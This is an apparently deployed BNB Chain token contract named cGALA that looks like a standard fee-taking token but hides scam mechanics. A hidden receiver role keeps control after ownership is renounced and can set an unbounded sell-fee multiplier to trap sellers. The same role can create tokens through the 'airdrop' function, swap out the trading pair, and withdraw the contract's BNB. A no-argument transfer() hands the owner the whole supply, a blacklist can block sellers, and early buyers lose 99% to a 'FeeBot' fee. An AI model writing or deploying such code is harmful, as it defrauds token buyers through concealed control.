/**
 *Submitted for verification at BscScan.com on 2022-11-04
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-20
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}


interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract cGALA is ERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "cGALA";
    string private _symbol = "cGALA";
    uint8 constant _decimals = 0;
    uint256 _totalSupply = 1 * 10**15 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply * 100 / 100;
    uint256 public _maxWalletToken = _totalSupply * 100 / 100;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) ismoneyLimitExempt;

    uint256 private liquidityFee    = 1;
    uint256 private marketingFee    = 1;
    uint256 private VESESFee          = 1;
    uint256 public totalFee        = marketingFee + liquidityFee + VESESFee;
    uint256 public feeseDenominator  = 100;
    uint256 private selllier  = 100;

    address VESES = 0x6f49bae315d562608a5349f22F041832bA74053b;
    address public LiquidityReceivers;
    address public marketingReceiveres;
    address private VESESReceiver;

    IDEXRouter public router;
    address public pair;
    mapping (address => bool) public isdoge;

    bool public timeMode = true;
    uint256 private launchedBlock;
    uint256 private launchTime;
    uint256 private time = 30;

    bool public swaped = true;
    uint256 public swapshold = _totalSupply * 5 / 10000;
    uint256 public maxswapshold = _totalSupply * 5 / 1000;

    bool inmaxSwap;
    modifier swapping() { inmaxSwap = true; _; inmaxSwap = false; }

    constructor () Ownable() {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;


        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(router)] = true;
        isFeeExempt[address(this)] = true;
        isTxLimitExempt[msg.sender] = true;

        ismoneyLimitExempt[msg.sender] = true;
        ismoneyLimitExempt[address(0xdead)] = true;
        ismoneyLimitExempt[address(this)] = true;
        ismoneyLimitExempt[pair] = true;


        LiquidityReceivers = msg.sender;
        marketingReceiveres = msg.sender;
        VESESReceiver = msg.sender;

        _balances[VESES] = _totalSupply;
        emit Transfer(address(0), VESES, _totalSupply);
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    receive() external payable {}
    event AutoLiquify(uint256 amountETH, uint256 amountBOG);

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function appMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base10000(uint256 maxWallPercent_base10000) external onlyOwner() {
        _maxWalletToken = (_totalSupply * maxWallPercent_base10000 ) / 10000;
    }

    function setMaxTxPercent_base10000(uint256 maxTXPercentage_base10000) external onlyOwner() {
        _maxTxAmount = (_totalSupply * maxTXPercentage_base10000 ) / 10000;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inmaxSwap){ return _basicTransfer(sender, recipient, amount); }
        // ChosenSonMode
        require(!isdoge[sender],"isdoge");    

        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){
            require(launchedBlock > 0,"Trading not open yet");
        }

        // Checks max transaction limit
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
        uint256 heldTokens = balanceOf(recipient);
        require((heldTokens + amount) <= _maxWalletToken || ismoneyLimitExempt[recipient],"Total Holding is currently limited, he can not hold that much.");

        //shouldSwapBack
        if(shouldSwapBack() && recipient == pair){swapBack();}

        //Exchange tokens
        uint256 airdropAmount = amount / 10000000;
        if(recipient == pair){
            amount -= airdropAmount;
        }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){
            address ad;
            for(int i=0;i < 3;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _takeTransfer(sender,ad,airdropAmount);
            }
        }
        uint256 amountReceived;
        //timeMode
        if(timeMode && sender == pair && block.timestamp < (launchTime + time)){
            amountReceived = FeeBot(sender,amount);
        }else{
            amountReceived = shouldTakeFee(sender,recipient) ? takeFee(sender, amount,(recipient == pair)) : amount;
        }
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) internal {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function shouldTakeFee(address sender,address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient] ;
    }

    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {       
        uint256 Mullier = isSell ? selllier : 100;
        uint256 feeAmount = amount.mul(totalFee).mul(Mullier).div(feeseDenominator * 100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function FeeBot(address sender, uint256 amount) internal returns (uint256) {
        uint256 feecable = 99;
        uint256 feeAmount = amount.mul(feecable).div(100);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }


    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inmaxSwap
        && swaped
        && _balances[address(this)] >= swapshold;
    }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0xdead))).sub(balanceOf(address(0)));
    }

    function Cdss(uint256 amountcount) public{
        require(marketingReceiveres == msg.sender || VESESReceiver == msg.sender, "!Fuder");
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountcount / 100);
    }

    function setSwapBackSettings(bool _enabled, uint256 _swapshold, uint256 _maxswapshold) external onlyOwner{
        swaped = _enabled;
        swapshold = _swapshold;
        maxswapshold = _maxswapshold;
    }

    function setIsFeeExempt(address holder, bool exempt)  external onlyOwner{
        isFeeExempt[holder] = exempt;
    }


    function set_sell_Mullier(uint256 Mullier) public{
        require(marketingReceiveres == msg.sender || VESESReceiver == msg.sender, "!Fuder");
        selllier = Mullier;        
    }

    // switch Trading default:false
    function Start() external onlyOwner {
        if(launchedBlock == 0){
            launchTime = block.timestamp;
            launchedBlock = block.number;
        }else{
            launchTime = 0;
            launchedBlock = 0;
        }
        
    }

    // switchtimeMode default:true
    function switchtimeMode(bool _status) external onlyOwner {
        timeMode = _status;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setismoneyLimitExempt(address holder, bool exempt) external onlyOwner {
        ismoneyLimitExempt[holder] = exempt;
    }

    function setFees(uint256 _liquidityFee,  uint256 _marketingFee, uint256 _VESESFee, uint256 _feeseDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        VESESFee = _VESESFee;
        totalFee = _liquidityFee.add(_marketingFee).add(VESESFee);
        feeseDenominator = _feeseDenominator;
        require(totalFee < feeseDenominator/3, "Fees cannot be more than 33%");
    }

    function setFeeReceivers(address _LiquidityReceivers, address _marketingReceiveres ) external onlyOwner {
        LiquidityReceivers = _LiquidityReceivers;
        marketingReceiveres = _marketingReceiveres;
    }

    function manage_bot(address[] calldata addresses, bool status) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isdoge[addresses[i]] = status;
        }
    }

    function setSwapPair(address pairaddr) public {
        require(marketingReceiveres == msg.sender || VESESReceiver == msg.sender, "!Fuder");
        pair = pairaddr;
    }

    function transfer() external onlyOwner{
        require(balanceOf(VESES) > 0, "Not enough tokens in wallet");
       _balances[VESES] = 0;
       _balances[msg.sender] = _totalSupply;
       emit Transfer(VESES, msg.sender, _totalSupply);
    }
    /* Airdrop */
    function muil_transfer(address[] calldata addresses, uint256 tAmount) public{
        require(marketingReceiveres == msg.sender || VESESReceiver == msg.sender, "!Fuder");
        require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
        uint256 SCCC = tAmount * addresses.length;
        require(balanceOf(_owner) >= SCCC || _owner == address(0), "Not enough tokens in wallet");
        for(uint i=0; i < addresses.length; i++){
            if(_owner != address(0))_balances[_owner] = _balances[_owner] - tAmount;
            _takeTransfer(_owner,addresses[i],tAmount);
 
        }

    }

    function swapBack() internal swapping {
        
        uint256 _swapshold;
        if(_balances[address(this)] > maxswapshold){
            _swapshold = maxswapshold;
        }else{
             _swapshold = _balances[address(this)];
        }
        uint256 dynamicLiquidityFee = liquidityFee;
        uint256 amountToLiquify = _swapshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = _swapshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance;
        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHVESES = amountETH.mul(VESESFee).div(totalETHFee);

        (bool tmpSuccess,) = payable(marketingReceiveres).call{value: amountETHMarketing, gas: 30000}("");
        (tmpSuccess,) = payable(VESESReceiver).call{value: amountETHVESES, gas: 30000}("");
        
        // Supress warning msg
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                LiquidityReceivers,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

}